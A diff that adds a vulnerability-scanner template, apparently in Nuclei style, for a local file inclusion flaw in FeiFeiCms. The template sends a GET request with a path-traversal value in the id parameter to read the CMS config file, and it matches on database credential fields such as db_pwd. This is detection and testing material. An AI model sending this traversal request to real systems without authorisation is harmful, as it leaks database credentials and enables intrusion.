@@ -1,0 +1,27 @@
+id: feifeicms-lfr
+brief:
+    title: FeiFeiCms - Local File Inclusion
+    by: princechaddha
+    level: high
+    about: FeiFeiCms is vulnerable to local file inclusion.
+    label:
+        - feifeicms
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <?php
+            - db_name
+            - db_pwd
+            - db_host
+          in: body
+          need: all
